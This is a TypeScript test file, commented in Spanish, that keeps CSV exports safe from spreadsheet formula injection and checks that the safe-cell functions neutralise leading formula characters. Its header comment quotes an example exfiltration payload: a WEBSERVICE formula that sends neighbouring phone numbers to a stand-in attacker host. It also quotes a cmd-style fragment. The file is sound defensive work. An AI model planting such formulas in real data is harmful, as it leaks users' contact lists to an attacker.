import { describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fuenteLimpia } from '../src/testing';
import { celdaCsv, csvSeguro } from '../src/csv';

/**
 * La regla anti-inyección de fórmulas, en UN solo lugar (#1170).
 *
 * ## Qué defecto viene a cazar
 *
 * `csvSeguro` existía desde #1076 escrito a mano dentro de
 * `apps/api/src/paquete-de-exportacion.ts`, con el comentario correcto («un CSV
 * que se abre en Excel con `=cmd|…` es una inyección, no un dato»). El otro
 * armador de CSV del repo —la exportación de contactos— nunca lo recibió:
 * doblaba las comillas y encerraba el valor, y encerrar entre comillas NO evita
 * nada, porque Excel saca las comillas al importar y evalúa el `=` igual.
 *
 * Eso quedó explosivo con #1170: hasta entonces `contacts.name` lo escribía el
 * negocio (su pantalla o su propio CSV); desde #1170 lo escribe un desconocido
 * no autenticado con el solo acto de mandar un WhatsApp, porque se guarda su
 * nombre de perfil. Un nombre de perfil
 * `=WEBSERVICE("https://evil.tld/?x="&B2&"|"&B3)` se evaluaba la primera vez
 * que alguien del negocio usaba Contactos → Exportar y abría el archivo: la
 * celda se llevaba los teléfonos de las filas vecinas al servidor de quien lo
 * escribió. La lista de contactos completa del tenant, por un «hola».
 *
 * Dos copias de una regla de seguridad son una regla aplicada y otra olvidada,
 * así que ahora es una, y esta guarda de FUENTE —la pregunta es «¿está
 * escrito?»— exige que ningún armador de CSV vuelva a armar la celda por su
 * cuenta.
 */

const RAIZ = join(__dirname, '..', '..', '..');

/**
 * La forma de armar una celda de CSV a mano: encerrar entre comillas doblando
 * las que trae el valor. Lo que se busca es la copia, no el texto exacto.
 */
const CELDA_A_MANO = String.raw`replace(/"/g, '""')`;

/**
 * Lo que queda fuera, con su motivo. No puede ser uno más sin que alguien lo
 * escriba acá.
 *
 *  · `packages/core/src/csv.ts` — es LA implementación.
 *  · `packages/db/src/blindaje.ts` — no es un CSV: cita identificadores de SQL
 *    que salen del catálogo de Postgres, no de una entrada.
 *  · `packages/modules/audit/src/export.ts` — mismo defecto de forma, y queda
 *    anotado a propósito en vez de arreglado de paso: `module-audit` no
 *    declara `@iaxti/core` entre sus dependencias, así que usar `csvSeguro`
 *    ahí es tocar su `package.json` y el lock en un PR que es de otra cosa.
 *    Su exposición además es distinta: las columnas del libro son ids,
 *    acciones y actores que escribe la plataforma, no texto que manda un
 *    desconocido. Su propio issue.
 */
const FUERA_DE_LA_REGLA = [
  'packages/core/src/csv.ts',
  'packages/db/src/blindaje.ts',
  'packages/modules/audit/src/export.ts',
];

function archivosQueArmanCeldaAMano(): string[] {
  // `git grep` y no un barrido propio: respeta `.gitignore`, así que no entra
  // ni `dist/` ni `node_modules/`, que es donde viven las copias compiladas de
  // lo mismo y harían fallar la guarda por nada.
  let salida = '';
  try {
    salida = execFileSync(
      'git',
      ['grep', '-l', '--fixed-strings', CELDA_A_MANO, '--', '*.ts'],
      { cwd: RAIZ, encoding: 'utf8' },
    );
  } catch (err) {
    // `git grep` sale con 1 cuando no encuentra nada: eso no es un fallo.
    if ((err as { status?: number }).status !== 1) throw err;
  }
  return salida
    .split('\n')
    .map((l) => l.trim())
    .filter(Boolean)
    .filter((ruta) => {
      // El comentario que explica la regla cita la regla: se lee la fuente
      // LIMPIA para que la guarda no se ponga roja por su propia explicación
      // (#569).
      const fuente = fuenteLimpia(readFileSync(join(RAIZ, ruta), 'utf8'));
      return fuente.includes(CELDA_A_MANO);
    });
}

describe('la celda de un CSV se arma en un solo lugar', () => {
  it('nadie la arma a mano fuera de las excepciones anotadas', () => {
      // Las PRUEBAS quedan fuera del barrido, incluida esta.
    //
    // No es comodidad: una prueba que arma la celda a mano lo hace para
    // comprobar que `csvSeguro` produce lo mismo, o para fabricar la entrada
    // peligrosa. Contarlas convierte la guarda en algo que se delata a sí
    // misma — y eso fue literal: esta prueba se puso roja en CI señalando su
    // propio archivo, y el `fuenteLimpia` no la salva porque el patrón está
    // en código, no en un comentario.
    //
    // Lo que se vigila es lo que corre en producción, que es `src/`.
    const copias = archivosQueArmanCeldaAMano()
      .filter((r) => !FUERA_DE_LA_REGLA.includes(r))
      .filter((r) => !/(^|\/)tests?\//.test(r) && !/\.test\.tsx?$/.test(r));
    expect(copias).toEqual([]);
  });

  it('la exportación de contactos pasa por `csvSeguro`', () => {
    // La prueba de la fuga concreta: este archivo es el que sirve la columna
    // `nombre`, que desde #1170 la escribe quien manda el mensaje.
    const fuente = readFileSync(
      join(RAIZ, 'packages', 'modules', 'crm', 'application', 'exportar-contactos.ts'),
      'utf8',
    );
    expect(fuenteLimpia(fuente)).toContain('celdaCsv');
  });
});

describe('una fórmula no es un dato', () => {
  for (const arranque of ['=', '+', '-', '@', '\t', '\r']) {
    it(`un valor que empieza con ${JSON.stringify(arranque)} sale inerte`, () => {
      const valor = `${arranque}SUM(A1:A9)`;
      // El `'` adelante es lo único que para la evaluación: Excel saca las
      // comillas al importar, así que encerrar el valor no alcanza.
      expect(csvSeguro(valor)).toBe(`"'${valor}"`);
      expect(celdaCsv(valor)).toBe(`"'${valor}"`);
    });
  }

  it('un nombre normal no se toca', () => {
    expect(csvSeguro('Javiera Rojas')).toBe('"Javiera Rojas"');
  });

  it('las comillas del valor no corren las columnas', () => {
    expect(csvSeguro('dijo "hola"')).toBe('"dijo ""hola"""');
  });

  it('vacío es vacío, y una fecha va en ISO', () => {
    expect(celdaCsv(null)).toBe('""');
    expect(celdaCsv(undefined)).toBe('""');
    expect(celdaCsv(new Date('2026-10-31T12:00:00.000Z'))).toBe('"2026-10-31T12:00:00.000Z"');
  });
});
